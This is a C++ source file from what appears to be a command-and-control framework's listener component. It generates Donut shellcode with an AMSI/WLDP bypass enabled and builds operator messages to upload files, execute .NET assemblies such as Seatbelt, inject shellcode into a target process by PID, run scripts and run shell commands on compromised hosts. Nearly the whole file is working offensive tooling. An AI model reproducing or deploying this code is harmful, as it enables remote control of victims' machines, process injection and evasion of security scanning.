#include "Listener.hpp"

#include <donut.h>


using namespace std;


int creatShellCodeDonut(std::string cmd, std::string args, string& shellcode)
{
	// Donut
	DONUT_CONFIG c;
	memset(&c, 0, sizeof(c));

	// copy input file
	lstrcpyn(c.input, cmd.c_str(), DONUT_MAX_NAME - 1);

	// default settings
	c.inst_type = DONUT_INSTANCE_EMBED;     // file is embedded
	c.arch = DONUT_ARCH_X84;                // dual-mode (x86+amd64)
	c.bypass = DONUT_BYPASS_CONTINUE;       // continues loading even if disabling AMSI/WLDP fails
	c.format = DONUT_FORMAT_BINARY;         // default output format
	c.compress = DONUT_COMPRESS_NONE;       // compression is disabled by default
	c.entropy = DONUT_ENTROPY_DEFAULT;      // enable random names + symmetric encryption by default
	c.exit_opt = DONUT_OPT_EXIT_THREAD;     // default behaviour is to exit the thread
	c.thread = 1;                           // run entrypoint as a thread
	c.unicode = 0;                          // command line will not be converted to unicode for unmanaged DLL function
	lstrcpyn(c.param, args.c_str(), DONUT_MAX_NAME - 1);

	// generate the shellcode
	int err = DonutCreate(&c);
	if (err != DONUT_ERROR_SUCCESS) {
		printf("  [ Error : %s\n", DonutError(err));
		return 0;
	}

	printf("  [ loader saved to %s\n", c.output);

	DonutDelete(&c);

	std::ifstream input(c.output, std::ios::binary);
	std::string buffer(std::istreambuf_iterator<char>(input), {});
	shellcode = buffer;

	return 0;
}


Listener::Listener(int idxSession)
{
	m_idxSession = idxSession;
}


Listener::~Listener()
{

}


bool Listener::execInstruction(std::vector<std::string>& splitedCmd, C2Message& c2Message)
{
	if (splitedCmd[0] == "upload")
	{
		string inputFile = splitedCmd[1];
		string outputFile = splitedCmd[2];

		std::ifstream input(inputFile, std::ios::binary);
		std::string buffer(std::istreambuf_iterator<char>(input), {});

		c2Message.set_instruction(splitedCmd[0]);
		c2Message.set_inputfile(inputFile);
		c2Message.set_outputfile(outputFile);
		c2Message.set_data(buffer.data(), buffer.size());
	}
	else if (splitedCmd[0] == "exec-assembly")
	{
		string inputFile = splitedCmd[1];

#ifdef __linux__ 

		std::ifstream input(inputFile, std::ios::binary);
		std::string buffer(std::istreambuf_iterator<char>(input), {});

		std::string payload;
		const char* bufferPtr = buffer.data();
		for (int i = 0; i < buffer.size() / 4; i++)
		{
			unsigned char tmp = 0;
			//sscanf(bufferPtr, "\\x%2hhx", &tmp);
			sscanf_s(bufferPtr, "\\x%2hhx", &tmp);
			bufferPtr += 4;
			payload.push_back(tmp);
		}

		c2Message.set_instruction(splitedCmd[0]);
		c2Message.set_inputfile(inputFile);
		c2Message.set_data(payload.data(), payload.size());

#elif _WIN32

		std::string cmd = "Seatbelt.exe";
		std::string args = "-group=system";
		std::string payload;

		creatShellCodeDonut(inputFile, args, payload);

		std::cout << "exec-assembly " << inputFile << " " << args << " size payload " << payload.size() << std::endl;

		c2Message.set_instruction(splitedCmd[0]);
		c2Message.set_inputfile(inputFile);
		c2Message.set_data(payload.data(), payload.size());

#endif
		
	}
	else if (splitedCmd[0] == "script")
	{
		string inputFile = splitedCmd[1];

		std::ifstream input(inputFile, std::ios::binary);
		std::string buffer(std::istreambuf_iterator<char>(input), {});

		c2Message.set_instruction(splitedCmd[0]);
		c2Message.set_inputfile(inputFile);
		c2Message.set_data(buffer.data(), buffer.size());
	}
	else if (splitedCmd[0] == "inject")
	{
		string inputFile = splitedCmd[1];
		int pid = stoi(splitedCmd[2]);

#ifdef __linux__ 

		std::ifstream input(inputFile, std::ios::binary);
		std::string buffer(std::istreambuf_iterator<char>(input), {});

		std::string payload;
		const char* bufferPtr = buffer.data();
		for (int i = 0; i < buffer.size() / 4; i++)
		{
			unsigned char tmp = 0;
			//sscanf(bufferPtr, "\\x%2hhx", &tmp);
			sscanf_s(bufferPtr, "\\x%2hhx", &tmp);
			bufferPtr += 4;
			payload.push_back(tmp);
		}

		c2Message.set_instruction(splitedCmd[0]);
		c2Message.set_inputfile(inputFile);
		c2Message.set_pidinjection(pid);
		c2Message.set_data(payload.data(), payload.size());

#elif _WIN32

		std::string cmd = "Seatbelt.exe";
		std::string args = "-group=system";
		std::string payload;

		creatShellCodeDonut(inputFile, args, payload);

		std::cout << "inject " << inputFile << " " << args << " size payload " << payload.size() << std::endl;

		c2Message.set_instruction(splitedCmd[0]);
		c2Message.set_inputfile(inputFile);
		c2Message.set_pidinjection(pid);
		c2Message.set_data(payload.data(), payload.size());

#endif
	}
	else if (splitedCmd[0] == "run")
	{
		string shellCmd;
		for (int i = 1; i < splitedCmd.size(); i++)
		{
			shellCmd += splitedCmd[i];
			shellCmd += " ";
		}

		c2Message.set_instruction(splitedCmd[0]);
		c2Message.set_shellcmd(shellCmd);
	}

	return 0;
}